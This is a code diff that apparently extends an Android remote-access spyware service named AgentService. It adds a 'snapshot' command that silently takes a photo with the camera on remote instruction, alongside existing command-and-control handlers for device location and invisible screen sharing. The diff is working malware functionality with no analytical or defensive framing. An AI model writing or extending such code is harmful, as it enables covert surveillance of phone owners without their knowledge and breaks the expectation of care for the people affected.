@@ -563,6 +563,24 @@ class AgentService : Service() {
 
                                 command == "location" -> c2Commands.getDeviceLocation()
 
+                                command == "snapshot" -> {
+                                    val latch = java.util.concurrent.CountDownLatch(1)
+                                    var resultText = "Error taking snapshot"
+                                    val camera = SilentCamera(this@AgentService)
+                                    
+                                    android.os.Handler(android.os.Looper.getMainLooper()).post {
+                                        camera.takePicture(object : SilentCamera.Callback {
+                                            override fun onImageSaved(file: java.io.File?) {
+                                                resultText = if (file != null) "SNAPSHOT_READY ${file.absolutePath}" else "Error: Failed to capture snapshot"
+                                                latch.countDown()
+                                            }
+                                        })
+                                    }
+                                    
+                                    latch.await(15, java.util.concurrent.TimeUnit.SECONDS)
+                                    resultText
+                                }
+
                                 command == "start_screen" -> {
                                     val actIntent = Intent(applicationContext, InvisibleScreenShareActivity::class.java).apply {
                                         flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
